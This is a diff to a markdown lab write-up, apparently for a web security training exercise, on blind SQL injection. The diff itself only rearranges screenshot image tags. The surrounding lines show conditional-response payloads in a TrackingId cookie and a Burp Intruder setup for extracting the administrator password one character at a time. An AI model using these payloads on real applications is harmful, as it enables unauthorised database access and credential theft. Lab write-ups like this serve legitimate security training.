@@ -21,8 +21,6 @@ TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
 
 Confirmed user exists.
 
-<img alt="request" src="2.png" />
-
 ### Step 4 — Determine password length
 TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a  
 
@@ -35,9 +33,6 @@ Used Burp Intruder (Cluster Bomb):
 - Position 2: characters (a–z, 0–9)  
 - Grep match: "Welcome back"  
 
-<img alt="intruder-setup" src="3.png" />
-<img alt="intruder-results" src="4.png" />
-<img alt="results-detail" src="6.png" />
 
 ### Step 6 — Result
 Extracted password:
@@ -52,7 +47,9 @@ Blind SQL injection relies on application behavior to infer data, often requirin
 
 ## Proof
 
+<img alt="request" src="1.png" />
 <img alt="request" src="2.png" />
 <img alt="intruder" src="3.png" />
 <img alt="results" src="4.png" />
+<img alt="results" src="5.png" />
 <img alt="detail" src="6.png" />
